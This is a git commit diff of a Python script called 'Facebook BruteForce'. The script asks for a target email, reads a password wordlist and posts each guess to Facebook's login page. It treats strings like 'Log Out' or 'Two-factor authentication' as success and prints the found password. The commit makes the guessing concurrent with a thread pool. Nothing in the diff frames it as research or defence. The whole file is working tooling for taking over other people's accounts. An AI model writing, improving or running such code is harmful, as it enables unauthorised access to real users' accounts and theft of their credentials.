d2e419f22692f343adb98f137adbb371141e9a31
John <106311497+jhonsonk130@users.noreply.github.com>
2023-06-30 09:23:41 +0545

    burt.py

--- burt.py
+++ burt.py
@@ -1,5 +1,6 @@
 import os.path
 import requests
+import concurrent.futures
 from bs4 import BeautifulSoup
 import sys
 
@@ -14,15 +15,13 @@ POST_URL = 'https://www.facebook.com/login.php'
 HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
-PAYLOAD = {}
-COOKIES = {}
 
 
-def create_form():
+def create_form(session):
     form = dict()
     cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
 
-    data = requests.get(POST_URL, headers=HEADERS)
+    data = session.get(POST_URL, headers=HEADERS)
     for i in data.cookies:
         cookies[i.name] = i.value
     data = BeautifulSoup(data.text, 'html.parser').form
@@ -31,32 +30,47 @@ def create_form():
     return form, cookies
 
 
-def is_this_a_password(email, index, password):
-    global PAYLOAD, COOKIES
+def is_this_a_password(session, email, index, password):
     if index % 10 == 0:
-        PAYLOAD, COOKIES = create_form()
-        PAYLOAD['email'] = email
-    PAYLOAD['pass'] = password
-    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
+        payload, cookies = create_form(session)
+        payload['email'] = email
+    else:
+        payload = {}
+        cookies = {}
+
+    payload['pass'] = password
+    r = session.post(POST_URL, data=payload, cookies=cookies, headers=HEADERS)
     if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
         open('temp', 'w').write(str(r.content))
-        print('\password found is: ', password)
+        print('Password found: ', password)
         return True
     return False
 
 
+def process_password(email, index, password):
+    password = password.strip()
+    if len(password) < MIN_PASSWORD_LENGTH:
+        return False
+    print("Trying password [", index, "]: ", password)
+    with requests.Session() as session:
+        return is_this_a_password(session, email, index, password)
+
+
 if __name__ == "__main__":
-    print('\n---------- Welcome To Facebook BruteForce ----------\n')
+    print('\n------------ Facebook BruteForce ----------\n')
     if not os.path.isfile(PASSWORD_FILE):
-        print("Password file is not exist: ", PASSWORD_FILE)
+        print("Password file does not exist: ", PASSWORD_FILE)
         sys.exit(0)
-    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
+
+    password_data = []
+    with open(PASSWORD_FILE, 'r') as file:
+        password_data = [line.strip() for line in file]
+
     print("Password file selected: ", PASSWORD_FILE)
     email = input('Enter Email/Username to target: ').strip()
-    for index, password in zip(range(password_data.__len__()), password_data):
-        password = password.strip()
-        if len(password) < MIN_PASSWORD_LENGTH:
-            continue
-        print("Trying password [", index, "]: ", password)
-        if is_this_a_password(email, index, password):
-            break
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        results = [executor.submit(process_password, email, index, password) for index, password in enumerate(password_data)]
+        for future in concurrent.futures.as_completed(results):
+            if future.result():
+                break
